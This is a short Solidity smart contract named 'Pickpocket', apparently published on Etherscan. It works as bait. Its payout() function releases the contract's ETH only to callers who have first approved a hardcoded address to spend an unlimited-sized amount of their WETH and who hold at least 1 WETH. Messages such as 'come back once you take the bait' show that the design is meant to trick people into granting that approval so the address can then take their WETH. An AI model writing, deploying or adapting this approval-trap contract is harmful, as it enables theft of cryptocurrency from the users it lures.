/**
 *Submitted for verification at Etherscan.io on 2021-08-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// ty for playing <3 - ghili
contract Pickpocket {

    constructor() {
    }

    receive() external payable {}

    function finesse(address _payee) external {
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19, 1000000000 ether);
        (bool success, ) = _payee.call(abi.encodeWithSignature("payout()"));
        require(success, "Pickpocket: payout did not go thru :(");
    }

    function payout() external {
        IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        require(msg.sender == 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19 || weth.allowance(msg.sender, 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19) == 1000000000 ether, "come back once you take the bait");
        require(msg.sender == 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19 || weth.balanceOf(msg.sender) >= 1 ether, "you broke asl T-T");

        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Pickpocket: call did not go thru :(");
    }
}